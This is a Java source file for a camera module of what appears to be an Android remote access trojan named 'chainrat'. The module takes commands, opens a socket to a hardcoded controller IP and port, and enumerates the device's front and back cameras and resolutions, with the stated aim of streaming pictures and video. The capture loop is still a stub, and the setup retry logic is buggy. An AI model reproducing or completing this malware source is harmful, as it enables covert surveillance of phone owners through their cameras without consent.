package com.nefi.chainrat.modules;

import android.content.Context;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.SystemClock;
import android.support.annotation.NonNull;
import android.util.Log;
import android.util.Size;
import android.view.Surface;
import android.view.TextureView;
import android.view.TextureView.SurfaceTextureListener;
import com.nefi.chainrat.App;
import com.nefi.chainrat.CommandType;
import com.nefi.chainrat.IModule;
import com.nefi.chainrat.networking.Command;
import com.nefi.chainrat.networking.IOSocket;

import java.util.Arrays;

public class CameraModule implements IModule {

    private final static String TAG = "CameraModule";
    private String IP = "192.168.0.238";
    private int port = 5545;

    private Command command;
    private String[] args;
    private String[] cameraIdList;
    private String cameraID = "0";
    private Size[] cameraSizes;
    private Size cameraSize;

    private TextureView textureView;
    private CaptureRequest.Builder captureRequestBuilder;
    private CameraDevice camDevice;
    private CameraCaptureSession camCaptureSession;

    private String frontID;
    private Size[] frontSizes;
    private String backID;
    private Size[] backSizes;

    private Handler backgroundHandler;
    private HandlerThread handlerThread;


    private boolean isActive = true;
    private Context contextOfApplication = App.getContext();


    public CameraModule(){

    }

    @Override
    public String name() {
        return "Camera Controll v1";
    }

    @Override
    public String description() {
        return "Lets you stream pictures and videos";
    }

    @Override
    public CommandType handlerType() {
        return CommandType.CAMERA;
    }

    @Override
    public boolean execute(Command command) {
        this.command = command;
        this.args = command.getArgs();


        IOSocket socket = new IOSocket(IP, port);


        if (!setup()) {
            SystemClock.sleep(300);
            this.execute(command);
        }

        Log.d(TAG, "Front Facing Resolutions: ");
        for (Size frontSize : frontSizes) {
            Log.d(TAG, frontSize.getWidth() + " x " + frontSize.getHeight());
        }

        Log.d(TAG, "Back Facing Resolutions: ");
        for (Size backSize : backSizes) {
            Log.d(TAG, backSize.getWidth() + " x " + backSize.getHeight());
        }

        while (isActive) {
            //Do the camera stuff
            SystemClock.sleep(300);
        }
        return true;
    }

    public boolean setup() {
        Log.d(TAG, "Starting setup()");

        try {

            CameraManager cm = (CameraManager) App.getContext().getSystemService(Context.CAMERA_SERVICE);
            cameraIdList = cm.getCameraIdList();

            Log.d(TAG, "Looping through camera IDs: ");
            for (String cameraID : cameraIdList) {
                CameraCharacteristics characteristics = cm.getCameraCharacteristics(cameraID);

                //Set front / back Camera
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    frontID = cameraID;
                    frontSizes = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP).getOutputSizes(ImageFormat.JPEG);
                } else if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                    backID = cameraID;
                    backSizes = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP).getOutputSizes(ImageFormat.JPEG);
                }
                Log.d(TAG, "ID: " + cameraID);
            }

            //REmove me later
            cameraSizes = frontSizes;
            cameraSize = cameraSizes[0];

        } catch (Exception ex) {
            Log.d(TAG, "Error getting ID List: " + ex.getMessage());
            return false;
        }

        return true;
    }

    public void close() {
        this.isActive = false;
    }

    public void setImageSize(Size size){
        this.cameraSize = size;
    }

    public void switchCamera(boolean fromFront){
        if(fromFront){
            this.cameraID = frontID;
            this.cameraSizes = frontSizes;
        }else{
            this.cameraID = backID;
            this.cameraSizes = backSizes;
        }
    }
}
